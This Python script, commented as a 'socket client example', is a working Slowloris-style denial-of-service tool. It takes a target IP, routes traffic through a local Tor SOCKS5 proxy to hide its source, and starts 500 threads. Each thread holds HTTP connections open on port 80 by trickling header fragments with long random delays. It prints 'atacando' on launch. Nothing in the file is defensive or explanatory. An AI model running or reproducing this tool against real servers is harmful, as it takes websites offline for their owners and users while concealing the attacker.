#/usr/bin/python3
# Socket client example in python
import threading
import time
import socket
import sys
import random
import socks


numeroThreads=500


UserAgents=[
    "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
]
Accepts=["accept text/html,application/xhtml+xgtml,application/xml;q=0,9,*/*;q=0.8","text/html"]
AcceptLanguage=[ "en-us,en; q = 0.5","en-US,en;q = 0.5"]
AcceptEncoding=["gzip,deflate,br","gzip,deflate"]
Protocol=[0,1]
request=["GET / HTTP/1.","Host: ","User-Agent: ",
         "Accept-Language: ","Accept-Encoding: ",
         "Connection: keep-alive"]


remote_ip=sys.argv[1]
socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5,"127.0.0.1",9050,True)
def GerarRequest():

    saida=request[0]+str(Protocol[random.randint(0,1)])+"\r\n"
    saida+=request[1]+remote_ip+"\r\n"

    saida+=request[2]+UserAgents[random.randint(0,len(UserAgents)-1)]+"\r\n"
    saida+=request[3]+AcceptLanguage[random.randint(0,len(AcceptLanguage)-1)]+"\r\n"
    saida+=request[4]+AcceptEncoding[random.randint(0,len(AcceptEncoding)-1)]+"\r\n"
    saida+=request[5]+"\r\n\r\n"
    #saida=saida.encode('utf-8')
    #print (saida)
    return saida.encode()

port = 80  # web
def Conect():
    contador=0
    alvo=remote_ip
    #print ("atacando",alvo)
    while 1:
        solicitacao=GerarRequest()
        #print('iniciadoo socket ')
                # create socket
        try:
            s = socks.socksocket()
            #print('create socket')
        except:
            #print('erro criar socket')
            continue


        try:
            s.connect((alvo , port))

        except:
            print("erro ao conectar ao soquete, Servidor caiu?")
            #time.sleep(random.uniform(0.5,0.7))
            continue
        try:
            i=0
            saida=''
            #print (solicitacao)
            while i<len(solicitacao):
                aleatorio=min(random.randint(5,20),len(solicitacao)-i)
                s.send(solicitacao[i:i+aleatorio])
                saida+=str(solicitacao[i:i+aleatorio])
                #print (str(solicitacao[i:i+aleatorio])+"loop "+str(i))
                time.sleep(random.uniform(10.3, 15.2))
                i+=aleatorio

        except socket.error:
            continue
        #print (saida," saida")
       # print("HORA DA RESPOSTAAAAAAAAA")
        resp=s.recv(4096)
        #print (resp)
        contador+=1
    #print("saindo...")
    return 0

def main():
    lista=[]
    threadList=[]
    print("atacando")
            #:%s , atacando com %s threads%(alvo[0],alvo[1][:-1]))
    #print ("remote ip=",remote_ip)

    for numeroT in range(numeroThreads):

        threadList.append(threading.Thread(target=Conect))
        threadList[-1].start()

main()

